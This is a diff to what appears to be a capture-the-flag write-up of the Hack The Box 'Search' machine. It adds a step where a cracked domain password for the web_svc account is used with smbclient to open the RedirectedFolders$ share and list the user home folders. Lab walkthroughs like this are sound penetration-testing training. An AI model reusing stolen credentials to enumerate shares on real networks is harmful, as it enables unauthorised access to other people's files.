@@ -293,3 +293,39 @@ SMB         10.129.229.57   445    RESEARCH         [+] search.htb\web_svc:@3ONE
 ```
 This user is compromised!
 
+# `RedirectedFolders$` share
+
+```python
+smbclient //research.search.htb/RedirectedFolders$ -U 'web_svc'%'@3ONEmillionbaby'
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  Dc        0  Tue May 19 20:13:28 2026
+  ..                                 Dc        0  Tue May 19 20:13:28 2026
+  abril.suarez                       Dc        0  Tue Apr  7 19:12:58 2020
+  Angie.Duffy                        Dc        0  Fri Jul 31 14:11:32 2020
+  Antony.Russo                       Dc        0  Fri Jul 31 13:35:32 2020
+  belen.compton                      Dc        0  Tue Apr  7 19:32:31 2020
+  Cameron.Melendez                   Dc        0  Fri Jul 31 13:37:36 2020
+  chanel.bell                        Dc        0  Tue Apr  7 19:15:09 2020
+  Claudia.Pugh                       Dc        0  Fri Jul 31 14:09:08 2020
+  Cortez.Hickman                     Dc        0  Fri Jul 31 13:02:04 2020
+  dax.santiago                       Dc        0  Tue Apr  7 19:20:08 2020
+  Eddie.Stevens                      Dc        0  Fri Jul 31 12:55:34 2020
+  edgar.jacobs                       Dc        0  Thu Apr  9 21:04:11 2020
+  Edith.Walls                        Dc        0  Fri Jul 31 13:39:50 2020
+  eve.galvan                         Dc        0  Tue Apr  7 19:23:13 2020
+  frederick.cuevas                   Dc        0  Tue Apr  7 19:29:22 2020
+  hope.sharp                         Dc        0  Thu Apr  9 15:34:41 2020
+  jayla.roberts                      Dc        0  Tue Apr  7 19:07:00 2020
+  Jordan.Gregory                     Dc        0  Fri Jul 31 14:01:06 2020
+  payton.harmon                      Dc        0  Thu Apr  9 21:11:39 2020
+  Reginald.Morton                    Dc        0  Fri Jul 31 12:44:32 2020
+  santino.benjamin                   Dc        0  Tue Apr  7 19:10:25 2020
+  Savanah.Velazquez                  Dc        0  Fri Jul 31 13:21:42 2020
+  sierra.frye                        Dc        0  Thu Nov 18 01:01:46 2021
+  trace.ryan                         Dc        0  Thu Apr  9 21:14:26 2020
+
+		3246079 blocks of size 4096. 740692 blocks available
+smb: \> 
+```
+Looks to be all the user folders 
